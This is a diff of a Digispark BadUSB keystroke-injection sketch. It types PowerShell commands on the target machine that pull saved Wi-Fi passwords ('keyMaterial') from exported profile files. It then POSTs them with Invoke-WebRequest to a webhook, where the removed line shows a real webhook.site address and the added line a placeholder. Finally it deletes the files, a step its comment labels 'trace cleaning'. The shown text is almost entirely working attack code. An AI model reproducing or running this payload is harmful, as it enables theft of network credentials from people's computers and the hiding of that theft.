@@ -18,7 +18,7 @@ void setup() {
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi_Cred"); //Extracts SSID & Credential part & write it into a text file
   DigiKeyboard.delay(500);  
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/2fdbf17a-830b-4dc3-9838-810d0e27af4e -Method POST -InFile Wi-Fi_Cred"); //Sent POST Request to webhook (change it to your webhook url)
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri <Webhook URL> -Method POST -InFile Wi-Fi_Cred"); //Sent POST Request to webhook (change it to your webhook url)
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); //trace cleaning
   DigiKeyboard.delay(500);  
